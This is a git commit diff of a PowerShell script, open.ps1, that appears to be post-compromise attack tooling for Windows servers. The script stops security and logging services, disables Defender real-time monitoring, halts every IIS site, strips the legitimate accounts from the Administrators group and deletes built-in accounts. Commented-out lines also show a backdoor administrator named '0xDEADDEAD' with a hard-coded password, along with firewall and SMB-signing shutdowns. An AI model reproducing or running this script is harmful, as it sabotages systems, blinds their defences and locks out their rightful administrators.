34e154c05851b500c73aa8d39f26b86502f0d556
stefanos007 <omgandthreelols@gmail.com>
2024-04-03 18:34:25 +0300

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -2,16 +2,19 @@ Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
 Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
 Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
-Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
-Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
-Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
-Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
+#Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
+#Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
+#Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
+#Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
+Set-MpPreference -DisableRealtimeMonitoring $true
+Get-IISSite | ForEach{Stop-IISSite -Name $_}
 
-$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
-New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
-Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
-Disable-LocalUser -Name "algo"
-Disable-LocalUser -Name "Administrator"
+#$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
+#New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
+#Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
+Remove-LocalGroupMember -Group "Administrators" -Member @("algo","Administrator")
+#Disable-LocalUser -Name "algo"
+#Disable-LocalUser -Name "Administrator"
 Remove-LocalUser -Name "Guest"
 Remove-LocalUser -Name "WDAGUtilityAccount"
 Remove-LocalUser -Name "DefaultAccount"
